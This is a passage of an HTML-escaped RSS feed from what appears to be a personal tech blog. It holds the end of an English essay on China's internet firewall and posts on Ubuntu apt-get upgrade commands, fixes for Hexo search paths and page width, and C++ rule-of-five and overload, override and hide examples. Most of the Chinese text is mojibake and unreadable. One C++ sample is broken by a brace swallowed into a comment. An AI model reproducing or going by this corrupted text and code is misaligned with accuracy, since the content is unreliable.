&lt;p>&lt;strong>Business.&lt;/strong> If Google and Facebook were allowed to develop in China in the last ten years, Google and Facebook would have monopolized the search engine field and instant message field in China. Subsequently, Tencent (the same as Facebook) and Baidu (the same as Google) company would not rise. As a result, Chinese internet industry would be monopolized by Google and Facebook which are foreign companies that belong to the United States. So these companies can earn a lot of money from China and wouldnât give any space for any Chinese companies. It may damage local internet companies. Therefore, after the government built The National Firewall, it created a lot of opportunities for the Chinese company to improve their technique.&lt;/p>
&lt;p>&lt;strong>Cultural and social protection.&lt;/strong> If Facebook and Google had controlled the domestic cultural market in China, they would have exported their culture and values through China, and it may cause a terrible influence on traditional Chinese Culture. In social media field, it is easier to control the media and public opinion direction.&lt;/p>
&lt;p>&lt;strong>National security.&lt;/strong> Taking Huawei company as an example, Huawei has recently prepared how they can enter the United States market. However, the American government believes that their products will pose a threat to the United States because they suspect that this is a Chinese company which may be controlled by the Chinese government. As one of the largest company in the world, Google owns a sizeable amount of personal information data. When they occupy Chinese market, they may damage the Chinese information safety because this firm belongs to another country. From the government points of view, they canât believe these companies can be independent of their government.&lt;/p>
&lt;hr>
&lt;h1 id="conclusions-and-future-study">Conclusions and Future Study&lt;/h1>
&lt;p>When ostrich encounters their enemy in the desert, they would bury their head in the sand and think that the enemy can not see them.The Chinese government built an Internet wall like an ostrich shielding of the best-known websites, such as Google. Ironically, the Internet wall is useless to block libertarian news. Most Chinese people know that even the government blocks âthing,â someone also can read it in the foreign countries. Nowadays, the international information exchange is frequent. For example, there were 2.59 million Chinese people who traveled to the US during last year. They can easily read every new they liked. Also, some Chinese people often over the Internet wall to read foreign news. As they say, that âGood news never goes beyond the gate, while bad news spread far and wide.â The more blocking, the more attention.&lt;/p>
&lt;p>The Chinese government is blocking some famous websites in the world just because they want to protect small, influential group and individual. Some expect who supports the Internet control policies in China, has often been cited a word, &amp;ldquo;I have no way to change you, but I have the right to choose our friends.&amp;rdquo; said by LuHui, the director of the state Internet information office. He is the manager of the Chinese Internet as most foreign media. He said, âwe are welcome any Internet company to enter the Chinese market, but you must observe two regulations: donât harmful on Chinaâs national security and donât harmful on Chinese consumersâ rights.â According to his opinion, the Chinese government shielding Google Google, Facebook, Twitter, YouTube, and thousands of websites such as Wikipedia Wikipedia, is to protect &amp;quot; the consumersâ rights&amp;rdquo; and &amp;ldquo;national security&amp;rdquo; But the analysis of the above in this essay, we already know that it is not entirely correct. This censorship system only works for small group and individual interests to block world-famous sites to maintain a popular figure.&lt;/p>
&lt;p>If this country always hides in the back of the internet walls by governments, it may be relatively safe. But they canât catch up with other advanced power in the world in the future. Besides, it also unable to obtain the respect of other nations or countries. &amp;ldquo;I have no way to change you, but I have the right to choose friends, &amp;quot; said by LuHui is good, but this sentence also applies to the Chinese people. They will have the right to choose which news they want to read.&lt;/p>
&lt;hr>
&lt;h1 id="references">References&lt;/h1>
&lt;p>A new approach to China. (2010, January 12). Retrieved from &lt;a href="https://googleblog.blogspot.com/2010/01/new-approach-to-china.html">https://googleblog.blogspot.com/2010/01/new-approach-to-china.html&lt;/a>&lt;/p>
&lt;p>In U.S., Fear Is Spreading Faster Than SARS. (2003, April 16). Retrieved from &lt;a href="http://www.nytimes.com/2003/04/17/world/the-sars-epidemic-asian-americans-in-us-fear-is-spreading-faster-than-sars.html">http://www.nytimes.com/2003/04/17/world/the-sars-epidemic-asian-americans-in-us-fear-is-spreading-faster-than-sars.html&lt;/a>&lt;/p>
&lt;p>King, G., Pan, J., &amp;amp; Roberts, M. E. (2013, 05). How Censorship in China Allows Government Criticism but Silences Collective Expression. American Political Science Review, 107(02), 326-343. doi:10.1017/s0003055413000014&lt;/p>
&lt;p>Qiu, J. L. (1999). Virtual censorship in China: Keeping the gate between the cyberspaces. International Journal of Communications Law and Policy, 4(1), 25.&lt;/p>
&lt;p>Revised U.S. Surveillance Case Definition for Severe Acute Respiratory Syndrome (SARS) and Update on SARS Cases, United States and Worldwide, December 2003. (n.d.). Retrieved from &lt;a href="https://www.cdc.gov/mmwr/preview/mmwrhtml/mm5249a2.htm">https://www.cdc.gov/mmwr/preview/mmwrhtml/mm5249a2.htm&lt;/a>&lt;/p>
&lt;p>Sorenson, A.(2013). Internet Censorship in China. Mankato, MN:Undergraduate Research Symposium.&lt;/p>
&lt;p>Xu, X., Mao, Z. M., &amp;amp; Halderman, J. A. (2011). Internet Censorship in China: Where Does the Filtering Occur? Passive and Active Measurement Lecture Notes in Computer Science, 133-142. doi:10.1007/978-3-642-19260-9_14&lt;/p></description></item><item><title>Ubuntuéé¢update,upgradeådist-upgradeçåºå«</title><link>http://www.guozet.me/post/Ubuntu-Update-Upgrade/</link><pubDate>Sun, 09 Sep 2018 15:09:31 +0000</pubDate><guid>http://www.guozet.me/post/Ubuntu-Update-Upgrade/</guid><description>&lt;h2 id="introduce">Introduce&lt;/h2>
&lt;p>&lt;strong>å¸¸ç¨çä¸ä¸ªå½ä»¤ï¼&lt;/strong>&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo apt-get update
sudo apt-get upgrade
sudo apt-get dist-upgrade
&lt;/code>&lt;/pre>
&lt;p>&lt;code>apt-get&lt;/code>æ¯æäºlinuxåè¡çä½¿ç¨çä¸ä¸ªâåç®¡çå¨âï¼è¿æå«çåè¡çä½¿ç¨yumç­ï¼ä»¥åbrewç­å¶ä»å¹³å°ä¸çåç®¡çå¨ï¼å·¥ä½åçç±»ä¼¼ï¼ãåç®¡çå¨çä½ç¨æ¯ä»æºï¼Sourceï¼æå¡å¨é£éä¸è½½ææ°çè½¯ä»¶ååè¡¨ï¼ç¶åå¨ä½ éè¦å®è£æä¸ªè½¯ä»¶åï¼apt-get installï¼çæ¶åä»åè¡¨éé¢æ¥è¯¢è¿ä¸ªè½¯ä»¶åççæ¬ä¿¡æ¯ãç³»ç»è¦æ±ãç¿»è¯ãä¾èµé¡¹ï¼è¯¥è½¯ä»¶æ­£å¸¸è¿è¡å¿é¡»å®è£çå¶å®è½¯ä»¶ï¼å¹¶ä¸æ·»å å°åæ¶å®è£çåè¡¨éé¢ï¼åæ¥è¯¢ææå®è£åè¡¨éé¢çè½¯ä»¶åç.debæä»¶ä¸è½½å°åï¼æåæ¹éä¸è½½ï¼èªå¨åæå®è£é¡ºåºç¶åå®è£å®æã&lt;/p>
&lt;hr>
&lt;h2 id="update--upgrade--dist-upgrade">update &amp;amp; upgrade &amp;amp; dist-upgrade&lt;/h2>
&lt;p>&lt;code>sudo apt-get update&lt;/code>å&lt;code>sudo apt-get upgrade&lt;/code>åå«æ´æ°çæ¯ä»ä¹ï¼&lt;/p>
&lt;ul>
&lt;li>updateæ¯ä¸è½½æºéé¢çmetadataç. åæ¬è¿ä¸ªæºæä»ä¹å, æ¯ä¸ªåä»ä¹çæ¬ä¹ç±»çï¼ææ°çæ¬æ¯ä»ä¹.&lt;/li>
&lt;li>upgradeæ¯æ ¹æ®updateå½ä»¤ä¸è½½çmetadataå³å®è¦æ´æ°ä»ä¹å(åæ¶è·åæ¯ä¸ªåçä½ç½®)ï¼å¯¹å·²ç»å®è£çè½¯ä»¶åæ¬èº«è¿è¡æ´æ°çè¿ç¨ãç±äºç¡®å®è¦æ´æ°çè½¯ä»¶åéè¦å¯¹æ¬å°å®è£ççæ¬ååè¡¨ççæ¬è¿è¡æ¯è¾ï¼æä»¥è¦å¨updateä»¥åè¿è¡è¿ä¸æ¡.&lt;/li>
&lt;li>dist-upgrade:å¯ä»¥èªæçè§£å³ç¸ä¾æ§çé®é¢,å¦ææç¸ä¾æ§é®é¢,éè¦å®è£/ç§»é¤æ°çPackage,å°±ä¼è¯çå»å®è£/ç§»é¤å®. (æä»¥éå¸¸è¿ä¸ªä¼è¢«è®¤ä¸ºæ¯æç¹é£é©çåçº§)&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>æ³¨æï¼å¨installæä½ä¹åæ§è¡updateåupgradeï¼å®éä¸æ¯ç¡®ä¿æ¬å°è½¯ä»¶åè¡¨ä¿¡æ¯åå·²å®è£è½¯ä»¶åä¸ºææ°çè¿ç¨ãè¿æ ·åå¯ä»¥æå¤§éåº¦å°ç¡®ä¿æ°å®è£çè½¯ä»¶åæ­£å¸¸å·¥ä½ã&lt;/p>
&lt;/blockquote>
&lt;p>PSï¼è½¯ä»¶æºæå¡å¨å°åå¯ä»¥å¨/etc/apt/sources.listéé¢çå°ã&lt;/p>
&lt;p>&lt;strong>Example: upgrade and dist-upgrade&lt;/strong>&lt;/p>
&lt;p>apt-get upgrade å apt-get dist-upgrade æ¬è´¨ä¸æ¯æ²¡æä»ä¹ä¸åçãåªä¸è¿ï¼dist-upgrade ä¼è¯å«åºå½ä¾èµå³ç³»æ¹åçæå½¢å¹¶ä½åºå¤çï¼èupgradeå¯¹æ­¤æå½¢ä¸å¤çã&lt;/p>
&lt;p>ä¾å¦è½¯ä»¶å a ååä¾èµ b c dï¼ä½æ¯å¨æºéé¢å¯è½å·²ç»åçº§äºï¼ç°å¨æ¯ a ä¾èµ b c eãè¿ç§æåµä¸ï¼dist-upgrade ä¼å é¤ d å®è£ eï¼å¹¶æ a è½¯ä»¶ååçº§ï¼è upgrade ä¼è®¤ä¸ºä¾èµå³ç³»æ¹åèæç»åçº§ a è½¯ä»¶åã&lt;/p></description></item><item><title>Hexoä½¿ç¨ä¸­çä¼åä»¥åé®é¢è§£å³è®°å½</title><link>http://www.guozet.me/post/Hexo-Optimize-and-patch/</link><pubDate>Sat, 08 Sep 2018 02:09:31 +0000</pubDate><guid>http://www.guozet.me/post/Hexo-Optimize-and-patch/</guid><description>&lt;h1 id="åè¨">åè¨&lt;/h1>
&lt;p>è®°å½å¯¹Hexoçä¼åï¼ä»¥åéç½®Hexoä¸­éå°çé®é¢ä»¥åè§£å³æ¹æ¡ã&lt;/p>
&lt;h1 id="é®é¢">é®é¢&lt;/h1>
&lt;h2 id="æ¬å°æç´¢è·¯å¾ä¸æ­£ç¡®">æ¬å°æç´¢è·¯å¾ä¸æ­£ç¡®&lt;/h2>
&lt;h3 id="é®é¢æè¿°">é®é¢æè¿°&lt;/h3>
&lt;p>æå¾è·¯å¾æ¯&lt;code>http://guozet.me/post/postname/&lt;/code>,ç¶åå®éå¾å°çè·¯å¾æ¯&lt;code>/post/postname/&lt;/code>ã
åæ£æ¥èªå·±ç
&lt;a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener">éç½®è¿ç¨&lt;/a>ï¼&lt;/p>
&lt;pre>&lt;code class="language-bash">$ npm install hexo-generator-search --save
&lt;/code>&lt;/pre>
&lt;p>ç«ç¹éç½®æä»¶ï¼&lt;code>_config.yml&lt;/code>ä¸­ä»»æä½ç½®å å¥ï¼&lt;/p>
&lt;pre>&lt;code class="language-bash">search:
path: search.xml
field: post
&lt;/code>&lt;/pre>
&lt;p>ææ¬å°çéç½®ä¸ä¸é¢çéç½®æ¯ä¸è´çï¼ä½æ¯è·¯å¾ä½ç½®å°±æ¯ä¸å¯¹ï¼ç»è¿æç´¢ï¼å¨è¿ä¸ª
&lt;a href="https://github.com/iissnan/hexo-theme-next/issues/1852" target="_blank" rel="noopener">é¾æ¥&lt;/a>è§£å³äºæçé®é¢ã&lt;/p>
&lt;h3 id="è§£å³æè·¯">è§£å³æè·¯&lt;/h3>
&lt;p>å¨æç´¢é¡µé¢ï¼ä½¿ç¨&lt;code>F12&lt;/code>æå¼ç¡®å®èªå·±çæç´¢è·¯å¾é¾æ¥æ¯å¦æé®é¢ã
&lt;img src="http://www.guozet.me/images/in-post/2018-09-08-Hexo-Optimize-and-patch/2018-09-08-02-18-22.png" alt="">
åç°å¨è·¯å¾ä½ç½®ï¼&lt;/p>
&lt;pre>&lt;code class="language-bash">&amp;lt;a href=&amp;quot;//post/Write-first-Analyzer-rip/&amp;quot; class=&amp;quot;search-result-title&amp;quot;&amp;gt;å¨&amp;lt;b class=&amp;quot;search-keyword&amp;quot;&amp;gt;Bro&amp;lt;/b&amp;gt;ä¸­å®æç¬¬ä¸ä¸ªåè®®åæå¨âRIPåè®®&amp;lt;/a&amp;gt;
&lt;/code>&lt;/pre>
&lt;p>è¿éæä¸¤ä¸ª&lt;code>//&lt;/code>å¨poståé¢ï¼ç´æ¥ä¿®æ¹éç½®æä»¶ï¼å»æä¸ä¸ª&lt;code>/&lt;/code>ã
ä¿®æ¹localsearch.swigæºç :&lt;/p>
&lt;pre>&lt;code class="language-bash">//var articleUrl = decodeURIComponent(data.url);
var articleUrl = decodeURIComponent(data.url).substring(1);//æªåç¬¬ä¸ä½/ææ 
&lt;/code>&lt;/pre>
&lt;h2 id="ä¿®æ¹é¡µé¢å®½åº¦">ä¿®æ¹é¡µé¢å®½åº¦&lt;/h2>
&lt;p>æä»¬ç¨Nextä¸»é¢æ¯åç°å¨çµèä¸éè¯»æç« æ¶åå®¹ä¸¤è¾¹ççç©ºç½è¾å¤ï¼è¿æ ·å¨æµè§ä»£ç åæ¶ç»å¸¸è¦æ»å¨æ»å¨æ¡æè½éè¯»å®æ´ï¼ä½éªä¸æ¯å¾å¥½ï¼ä¸é¢æä¾ä¿®æ¹åå®¹åºåçå®½åº¦çæ¹æ³ã
NexT å¯¹äºåå®¹çå®½åº¦çè®¾å®å¦ä¸ï¼&lt;/p>
&lt;p>700pxï¼å½å±å¹å®½åº¦ &amp;lt; 1600px
900pxï¼å½å±å¹å®½åº¦ &amp;gt;= 1600px
ç§»å¨è®¾å¤ä¸ï¼å®½åº¦èªéåº
å¦æä½ éè¦ä¿®æ¹åå®¹çå®½åº¦ï¼åæ ·éè¦ç¼è¾æ ·å¼æä»¶ã
å¨MiståMuseé£æ ¼å¯ä»¥ç¨ä¸é¢çæ¹æ³ï¼&lt;/p>
&lt;p>ç¼è¾ä¸»é¢ç source/css/_variables/custom.styl æä»¶ï¼æ°å¢åéï¼&lt;/p>
&lt;pre>&lt;code class="language-cpp">// ä¿®æ¹æä½ ææçå®½åº¦
$content-desktop = 700px
// å½è§çªè¶è¿ 1600px åçå®½åº¦
$content-desktop-large = 900px
&lt;/code>&lt;/pre></description></item><item><title>C++ä¹Rule of Five</title><link>http://www.guozet.me/post/C++-Rule-Of-Five/</link><pubDate>Wed, 05 Sep 2018 10:14:31 +0000</pubDate><guid>http://www.guozet.me/post/C++-Rule-Of-Five/</guid><description>&lt;h3 id="rule-of-five">Rule of five&lt;/h3>
&lt;p>Because the presence of a user-defined destructor, copy-constructor, or copy-assignment operator prevents implicit definition of the
&lt;a href="https://en.cppreference.com/w/cpp/language/move_constructor" title="cpp/language/move constructor" target="_blank" rel="noopener">move constructor&lt;/a> and the
&lt;a href="https://en.cppreference.com/w/cpp/language/move_operator" title="cpp/language/move operator" target="_blank" rel="noopener">move assignment operator&lt;/a>, any class for which move semantics are desirable, has to declare all five special member functions:&lt;/p>
&lt;pre>&lt;code class="language-cpp">class rule_of_five
{
char* cstring; // raw pointer used as a handle to a dynamically-allocated memory block
rule_of_five(const char* s, [std::size_t](http://en.cppreference.com/w/cpp/types/size_t) n) // to avoid counting twice
: cstring(new char[n]) // allocate
{
[std::memcpy](http://en.cppreference.com/w/cpp/string/byte/memcpy)(cstring, s, n); // populate
}
public:
rule_of_five(const char* s = &amp;quot;&amp;quot;)
: rule_of_five(s, [std::strlen](http://en.cppreference.com/w/cpp/string/byte/strlen)(s) + 1)
{}
~rule_of_five()
{
delete[] cstring; // deallocate
}
rule_of_five(const rule_of_five&amp;amp; other) // copy constructor
: rule_of_five(other.cstring)
{}
rule_of_five(rule_of_five&amp;amp;&amp;amp; other) noexcept // move constructor
: cstring([std::exchange](http://en.cppreference.com/w/cpp/utility/exchange)(other.cstring, nullptr))
{}
rule_of_five&amp;amp; operator=(const rule_of_five&amp;amp; other) // copy assignment
{
return *this = rule_of_five(other);
}
rule_of_five&amp;amp; operator=(rule_of_five&amp;amp;&amp;amp; other) noexcept // move assignment
{
[std::swap](http://en.cppreference.com/w/cpp/algorithm/swap)(cstring, other.cstring);
return *this;
}
// alternatively, replace both assignment operators with
// rule_of_five&amp;amp; operator=(rule_of_five other) noexcept
// {
// std::swap(cstring, other.cstring);
// return *this;
// }
};
&lt;/code>&lt;/pre>
&lt;p>Unlike Rule of Three, failing to provide move constructor and move assignment is usually not an error, but a missed optimization opportunity.&lt;/p>
&lt;p>&lt;strong>ç¬¬äºæ¡ï¼åè°éè½½ãè¦çåéè&lt;/strong>&lt;/p>
&lt;p>å¨C++ä¸­ï¼æ è®ºå¨ç±»ä½ç¨ååè¿æ¯å¤ï¼ä¸¤ä¸ªï¼æå¤ä¸ªï¼ååçå½æ°ï¼å¯è½ä¸ä»å¯è½æ¯ä»¥ä¸ä¸ç§å³ç³»ï¼éè½½ï¼Overloadï¼ãè¦çï¼Overrideï¼åéèï¼Hideï¼ï¼å ä¸ºååï¼åºåè¿äºå³ç³»åæ¯æ ¹æ®åæ°æ¯å¦ç¸åãæ¯å¦å¸¦æconstæåå½æ°æ§è´¨ãæ¯å¦ævirtualå³é®å­ä¿®é¥°ä»¥åæ¯å¦å¨åä¸ä½ç¨åæ¥å¤æ­ãå¨ç¬¬åæ¡ä¸­ï¼æä»¬æ¾æå°äºä¸äºå³äºéè½½ãè¦ççæ¦å¿µï¼ä½åªæ¯ä¸å¸¦èè¿ï¼ä¹æ²¡ææå°éèï¼è¿ä¸ç¯æä»¬å°è¯¦ç»è®¨è®ºã&lt;/p>
&lt;p>1ãé¦åè¯´çæ¯éè½½ï¼æä¸ä¸ªåæå¿é¡»è¦å¼æ¸æ¥çæ¯ï¼å¦æä¸å¨ç±»ä½ç¨ååè¿è¡è®¨è®ºï¼ä¸¤ä¸ªï¼æå¤ä¸ªï¼ååå½æ°ä¹é´çå³ç³»åªå¯è½æ¯éè½½æéèï¼è¿éåè¯´éè½½ãèèä»¥ä¸äºå®ï¼&lt;/p>
&lt;pre>&lt;code class="language-cpp">int foo(char c){...}
void foo(int x){...}
&lt;/code>&lt;/pre>
&lt;p>è¿ä¸¤ä¸ªå½æ°ä¹é´çå³ç³»æ¯&lt;strong>éè½½ï¼overloadï¼ï¼å³ç¸åå½æ°åä½åæ°ä¸åï¼å¹¶æ³¨æè¿åç±»åæ¯å¦ç¸åå¹¶ä¸ä¼å¯¹éè½½äº§çä»»ä½å½±å&lt;/strong>ã&lt;/p>
&lt;p>ä¹å°±æ¯è¯´ï¼&lt;strong>å¦æä»ä»æ¯è¿åç±»åä¸ç¸åï¼èå½æ°åååæ°é½å®å¨ç¸åçä¸¤ä¸ªå½æ°ï¼ä¸è½ææéè½½&lt;/strong>ï¼ç¼è¯å¨ä¼åç¥&amp;quot;ambiguous&amp;rdquo;ï¼äºä¹æ§ï¼ç­è¯ä»¥è¡¨è¾¾å¶ä¸æ»¡ï¼&lt;/p>
&lt;pre>&lt;code class="language-cpp">//Can't be compiled!
int fooo(char c){...}
void fooo(char c){...}
char c = 'A';
fooo(c); // Which one? ambiguous
&lt;/code>&lt;/pre>
&lt;p>å¨ç¬¬åæ¡ä¸­ï¼å·²ç»è®²è¿°è¿ï¼éè½½æ¯ç¼è¯æç»å®çéæè¡ä¸ºï¼ä¸æ¯çæ­£çå¤ææ§ï¼é£ä¹ï¼ç¼è¯å¨æ¯æ ¹æ®ä»ä¹æ¥è¿è¡éæç»å®å¢ï¼åæ¯å¦ä½ç¡®å®ä¸¤ä¸ªï¼æå¤ä¸ªï¼å½æ°ä¹é´çå³ç³»æ¯éè½½å¢ï¼&lt;/p>
&lt;p>æä»¥ä¸å¤å®ä¾æ®ï¼&lt;/p>
&lt;p>ï¼1ï¼ç¸åçèå´ï¼å³ä½ç¨åï¼è¿éæå¨åä¸ä¸ªç±»ä¸­ï¼æåä¸ä¸ªåå­ç©ºé´ï¼å³&lt;strong>C++çå½æ°éè½½ä¸æ¯æè·¨è¶ä½ç¨åè¿è¡&lt;/strong>ï¼è¯»èå¯åæ¬¡å¯¹æ¯Javaå¨è¿é®é¢ä¸çç¥å¥å¤çï¼æ¢ä¸æ¬¡Javaç»æä»¬æä¾äºæªååç¥çå¨æç»å®è½ååï¼Javaè¶ä¸æµçæè¯åå¤§å±è§åæ¬¡ç»Javaç¨åºåæä¾äºè·¨ç±»éè½½çè½åï¼å¦æå´è¶£å¯è¯¦ç»éè¯»ãThinking in Javaãçç¸å³ç« èï¼å¶å®å¯¹äºå­¦å¥½C++æ¥è®²ï¼å»å­¦ä¸ä¸Javaæ¯å¾æå¸®å©çï¼å®ä¼åè¯ä½ ï¼åæ ·æç±»ä¼¼çé®é¢ï¼ä¸ºä»ä¹Javaè¦åè¿æ ·çæ¹è¿ï¼ï¼è¿ä¹æ¯åºå«éè½½åéèçæéè¦ä¾æ®ã&lt;/p>
&lt;p>å³äºâC++ä¸è½æ¯æè·¨ç±»éè½½âï¼ç¨åç¬èä¼ç»åºä»£ç æ¥ä¾è¯è¿ä¸ç¹ã&lt;/p>
&lt;p>ï¼2ï¼å½æ°åå­ç¸åï¼åºæ¬åæï¼&lt;/p>
&lt;p>ï¼3ï¼å½æ°åæ°ä¸åï¼åºæ¬åæï¼å¦åå¨åä¸ä½ç¨ååæä¸¤ä¸ªæå¤ä¸ªååååæ°çå½æ°ï¼å°äº§çambiguousï¼å¦å¤æ³¨æï¼å¯¹äºæåå½æ°ï¼æ¯å¦æ¯constæåå½æ°ï¼å³å½æ°å£°æä¹åæ¯å¦å¸¦æconstæ å¿ï¼ å¯çè§£ä¸ºâåæ°ä¸åâï¼ï¼ç¬¬ï¼2ï¼åç¬¬ï¼3ï¼ç¹ç»ç§°âå½æ°ç¹å¾æ âä¸å&lt;/p>
&lt;p>ï¼4ï¼virtualå³é®å­å¯æå¯æ ä¸äº§çå½±åï¼å ä¸ºç¬¬ï¼1ï¼ç¹å·²ç»æåºï¼è¿æ¯å¨åä¸ä¸ªç±»ä¸­ï¼&lt;/p>
&lt;p>å³**âç¸åçèå´ï¼ç¹å¾æ ä¸åï¼å½ç¶ååæ¯è¯å®çï¼ï¼åçéè½½â**ã&lt;/p>
&lt;p>2ãè¦çï¼overrideï¼ï¼çæ­£çå¤æè¡ä¸ºï¼éè¿èå½æ°æ¥å®ç°ï¼æä»¥ï¼ç¼è¯å¨æ ¹æ®ä»¥ä¸ä¾æ®æ¥è¿è¡å¤å®ä¸¤ä¸ªï¼æ³¨æåªå¯è½æ¯ä¸¤ä¸ªï¼å³ä½¿å¨ç»§æ¿é¾ä¸­ï¼ä¹åªæ¯æè¿ä¸¤ä¸ªä¸ºä¸ç»ï¼å½æ°ä¹é´çå³ç³»æ¯è¦çï¼&lt;/p>
&lt;p>ï¼1ï¼ä¸åçèå´ï¼å³ä½¿ç¨åï¼ä¸¤ä¸ªå½æ°åå«ä½äºåºç±»åæ´¾çç±»ä¸­&lt;/p>
&lt;p>ï¼2ï¼å½æ°åå­ç¸åï¼åºæ¬åæï¼&lt;/p>
&lt;p>ï¼3ï¼å½æ°åæ°ä¹ç¸åï¼åºæ¬åæï¼ï¼ç¬¬ï¼2ï¼åç¬¬ï¼3ï¼ç¹ç»ç§°âå½æ°ç¹å¾æ âç¸å&lt;/p>
&lt;p>ï¼4ï¼åºç±»å½æ°å¿é¡»ç¨virtualå³é®å­ä¿®é¥°&lt;/p>
&lt;p>å³**âä¸åçèå´ï¼ç¹å¾æ ç¸åï¼ä¸åºç±»ævirtualå£°æï¼åçè¦çâ**ã&lt;/p>
&lt;p>3ãéèï¼Hideï¼ï¼å³ï¼&lt;/p>
&lt;p>ï¼1ï¼å¦ææ´¾çç±»å½æ°ä¸åºç±»å½æ°ååï¼ä½åæ°ä¸åï¼ç¹å¾æ ä¸åï¼ï¼æ­¤æ¶ï¼æ è®ºæ¯å¦ævirtualå³é®å­ï¼åºç±»çææååå½æ°é½å°è¢«éèï¼èä¸ä¼éè½½ï¼å ä¸ºä¸å¨åä¸ä¸ªç±»ä¸­ï¼&lt;/p>
&lt;p>ï¼2ï¼å¦ææ´¾çç±»å½æ°ä¸åºç±»å½æ°ååï¼ä¸åæ°ä¹ç¸åï¼ç¹å¾æ ç¸åï¼ï¼ä½åºç±»å½æ°æ²¡æç¨virtualå³é®å­å£°æï¼ååºç±»çææååå½æ°é½å°è¢«éèï¼èä¸ä¼è¦çï¼å ä¸ºæ²¡æå£°æä¸ºèå½æ°ã&lt;/p>
&lt;p>å³**âä¸åçèå´ï¼ç¹å¾æ ä¸åï¼å½ç¶ååæ¯è¯å®çï¼ï¼åçéèâ**ï¼æ**&amp;ldquo;ä¸åçèå´ï¼ç¹å¾æ ç¸åï¼ä½åºç±»æ²¡ævirtualå£°æï¼åçéèâ**ã&lt;/p>
&lt;p>å¯è§æä¸¤ç§äº§çéèçæåµï¼åå«å¯¹åºä¸è½æ»¡è¶³éè½½åè¦çæ¡ä»¶çæåµã&lt;/p>
&lt;p>å¦å¤å¿é¡»è¦æ³¨æçæ¯ï¼å¨ç±»å¤è®¨è®ºæ¶ï¼ä¹å¯è½åçéèï¼å¦å¨åå­ç©ºé´ä¸­ï¼å¦ä¸è¿°ä»£ç æç¤ºï¼&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;iostream&amp;gt;
using namespace std;
void foo(void) { cout &amp;lt;&amp;lt; &amp;quot;global foo()&amp;quot; &amp;lt;&amp;lt; endl; }
int foo(int x) { cout &amp;lt;&amp;lt; &amp;quot;global foo(int)&amp;quot; &amp;lt;&amp;lt; endl; return x; }
namespace a
{
void foo(void) { cout &amp;lt;&amp;lt; &amp;quot;a::foo()&amp;quot; &amp;lt;&amp;lt; endl; }
void callFoo(void)
{ foo();
// foo(10); Can't be compiled! }
}
int main(int argc, char** argv)
{
foo();
a::callFoo();
return 0;
}
&lt;/code>&lt;/pre>
&lt;p>è¾åºç»æï¼&lt;/p>
&lt;pre>&lt;code class="language-cpp">global foo()
a::foo()
&lt;/code>&lt;/pre>
&lt;p>æ³¨æï¼åå­ç©ºé´aä¸­çfooéèäºå¶å®ä½ç¨åï¼è¿éæ¯å¨å±ä½ç¨åï¼ä¸­çææfooåç§°ï¼foo(10)ä¸è½éè¿ç¼è¯ï¼å ä¸ºå¨å±ä½ç¨åä¸­çint foo(int)çæ¬ä¹å·²ç»è¢«a::foo()éèäºï¼é¤éä½¿ç¨::foo(10)æ¾å¼è¿è¡è°ç¨ã&lt;/p>
&lt;p>è¿ä¹åè¯æä»¬ï¼æ è®ºä½æ¶ï¼é½&lt;strong>ä½¿ç¨å®æ´åç§°ä¿®é¥°ï¼ä½ç¨åè§£æç¬¦è°ç¨å½æ°ï¼ææéãå¯¹è±¡è°ç¨æåå½æ°ï¼æ¯ä¸ç§å¥½çç¼ç¨ä¹ æ¯&lt;/strong>ã&lt;/p>
&lt;p>å¥½äºï¼ä¸é¢é¶é¶æ£æ£è¯´äºå¤ªå¤çè®ºçä¸è¥¿ï¼æä»¬éè¦ä¸æ®µå®éçä»£ç ï¼æ¥éªè¯ä¸è¿°ææçç»è®ºï¼&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;iostream&amp;gt;
using namespace std;
class Other
{
void* p;
};
class Base
{
public:
int iBase;
Base():iBase(10){}
virtual void f(int x = 20){ cout &amp;lt;&amp;lt; &amp;quot;Base::f()--&amp;quot; &amp;lt;&amp;lt; x &amp;lt;&amp;lt; endl; }
virtual void g(float f) { cout &amp;lt;&amp;lt; &amp;quot;Base::g(float)--&amp;quot; &amp;lt;&amp;lt; f &amp;lt;&amp;lt; endl; }
void g(Other&amp;amp; o) { cout &amp;lt;&amp;lt; &amp;quot;Base::g(Other&amp;amp;)&amp;quot; &amp;lt;&amp;lt; endl; }
void g(Other&amp;amp; o) const { cout &amp;lt;&amp;lt; &amp;quot;Base::g(Other&amp;amp;) const&amp;quot; &amp;lt;&amp;lt; endl;}
};
class Derived : public Base
{
public:
int iDerived;
Derived():iDerived(100){}
void f(int x = 200){ cout &amp;lt;&amp;lt; &amp;quot;Derived::f()--&amp;quot; &amp;lt;&amp;lt; x &amp;lt;&amp;lt; endl; }
virtual void g(int x) { cout &amp;lt;&amp;lt; &amp;quot;Derived::g(int)--&amp;quot; &amp;lt;&amp;lt; x &amp;lt;&amp;lt; endl; }
};
int main(int argc, char** argv)
{
Base* pBase = NULL;
Derived* pDerived = NULL;
Base b;
Derived d;
pBase = &amp;amp;b;
pDerived = &amp;amp;d;
Base* pBD = &amp;amp;d;
const Base* pC = &amp;amp;d;
const Base* const pCCP = &amp;amp;d;
Base* const pCP = &amp;amp;d;
int x = 5;
Other o;
float f = 3.1415926;
b.f();
pBase-&amp;gt;f();
d.f();
pDerived-&amp;gt;f();
pBD-&amp;gt;f();
b.g(x);
b.g(o);
d.g(x);
d.g(f);
// Can't be compiled!
// d.g(o);
pBD-&amp;gt;g(x);
pBD-&amp;gt;g(f);
pC-&amp;gt;g(o);
pCCP-&amp;gt;g(o);
pCP-&amp;gt;g(o);
return 0;
}
&lt;/code>&lt;/pre>
&lt;p>å¨ç¬èUbuntu 12.04 + gcc 4.6.3è¿è¡ç»æï¼&lt;/p>
&lt;pre>&lt;code class="language-bash">Base::f()--20 //b.f()ï¼éè¿å¯¹è±¡è°ç¨ï¼æ èç¹æ§ï¼éæç»å®
Base::f()--20 //åºç±»æéæååºç±»å¯¹è±¡ï¼è½ç¶æ¯å¨æç»å®ï¼ä½æ²¡æä½¿ç¨å°è¦ç
Derived::f()--200 //d.fï¼éè¿å¯¹è±¡è°ç¨ï¼æ èç¹æ§ï¼éæç»å®
Derived::f()--200 //å­ç±»æéæåå­ç±»å¯¹è±¡ï¼è½ç¶æ¯å¨æç»å®ï¼ä½æ²¡æä½¿ç¨å°è¦ç
